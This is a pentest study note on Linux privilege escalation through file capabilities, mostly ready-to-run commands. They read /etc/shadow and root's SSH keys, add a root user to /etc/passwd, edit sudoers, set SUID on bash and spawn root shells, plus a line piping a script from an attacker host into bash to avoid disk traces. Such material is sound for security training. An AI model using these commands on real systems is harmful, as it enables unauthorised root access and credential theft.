---
title: "Linux Capabilities — Privilege Escalation (Juggernaut)"
tags: [linux, capabilities, privilege-escalation, pentesting, security]
sources: [linux-capabilities-juggernaut.md]
updated: 2026-04-16
---

# Linux Capabilities — Privilege Escalation

_Source: Juggernaut Pentesting Academy (Oct 2022). Educational pentest context._

Capabilities can be a privilege escalation vector when set too permissively on
binaries — particularly scripting languages, text editors, or compression
tools.

## Mental model for attackers

Ask three questions when you find a capability set on a binary:

1. **Which capability** is it?
2. **What is it set on** (binary, process, service, user)?
3. **What can I do** with this capability that I otherwise couldn't?

## Enumeration

```bash
# All binaries with capabilities (most important)
getcap -r / 2>/dev/null

# Process capabilities (decode hex with capsh)
cat /proc/<PID>/status | grep Cap
capsh --decode=<hex>

# User capabilities
cat /etc/security/capability.conf

# Service capabilities (look for AmbientCapabilities=)
cat /lib/systemd/system/<service>.service
```

Also enumerate with **LinPEAS** (download into memory to avoid disk trace):

```bash
curl <attacker-ip>/linpeas.sh | bash
```

> **Note:** Non-standard binary locations are common — capabilities are often
> set on copies of binaries in custom paths. Always use the full absolute path,
> not the PATH-resolved one.

## GTFOBins strategy

The GTFOBins "Capabilities" function focuses on `cap_setuid`. For other
capabilities, match the **capability action** to the right GTFOBins function:

| Capability            | Relevant GTFOBins function |
| --------------------- | -------------------------- |
| `cap_dac_read_search` | File Read                  |
| `cap_dac_override`    | File Write                 |
| `cap_chown`           | File ownership → write     |
| `cap_fowner`          | File permissions → SUID    |
| `cap_setuid`          | Capabilities               |
| `cap_setgid`          | Capabilities               |

## cap_dac_read_search — privileged file reads

Read _any_ file (shadow, SSH keys, config files with credentials).

```bash
# gdb → /etc/shadow
/path/to/gdb -nx -ex 'python print(open("/etc/shadow").read())' -ex quit

# perl → /root/.ssh/id_rsa
/path/to/perl -ne print '/root/.ssh/id_rsa'

# tar → root's bash history
/path/to/tar xf "/root/.bash_history" -I '/bin/sh -c "cat 1>&2"'

# vim → open any file directly
/path/to/vim /root/passwords.txt
```

## cap_dac_override — privileged file writes

Write to _any_ file.

```bash
# python3: append root user to /etc/passwd
openssl passwd password    # → get hash
/path/to/python3 -c 'open("/etc/passwd","a").write("r00t:<hash>:0:0:root:/root:/bin/bash")'
su r00t  # password: password

# vim: add NOPASSWD to /etc/sudoers
/path/to/vim /etc/sudoers
# → add NOPASSWD to user line, :wq!
sudo su
```

## cap_chown — change file ownership

Change ownership to gain write access to root-owned files.

```bash
# perl: take ownership of /etc/shadow (UID=1000, shadow GID=42)
/path/to/perl -e 'chown 1000,42,"/etc/shadow"'
# Now edit shadow file to replace root's hash:
mkpasswd -m sha-512 password   # on attacker
# Replace root hash in shadow, then: su root
```

## cap_fowner — change file permissions

Most dangerous — can set SUID bit on any binary.

```bash
# python3: SUID on /bin/bash
/path/to/python3 -c 'import os;os.chmod("/bin/bash", 0o4755)'
/bin/bash -p   # root shell
```

> Best practice: copy binary to `/tmp` first, SUID the copy, avoid altering
> system binaries.

## cap_setuid — execute as UID 0

Most common in CTFs.

```bash
# perl
/path/to/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# python3
/path/to/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## cap_setgid — execute as any GID

Less powerful than setuid — primarily elevated read access.

```bash
# python3 as root group (0)
/path/to/python3 -c 'import os; os.setgid(0); os.system("/bin/bash")'

# python3 as shadow group (42) → read /etc/shadow
/path/to/python3 -c 'import os; os.setgid(42); os.system("/bin/bash")'
cat /etc/shadow
# crack hashes: hashcat -m 1800 hashes.txt rockyou.txt
```

## See also

- [Linux Capabilities](../concepts/linux-capabilities.md)
- [capabilities(7) man page](linux-capabilities-man7.md)
- [Arch Wiki: Capabilities](linux-capabilities-archwiki.md)
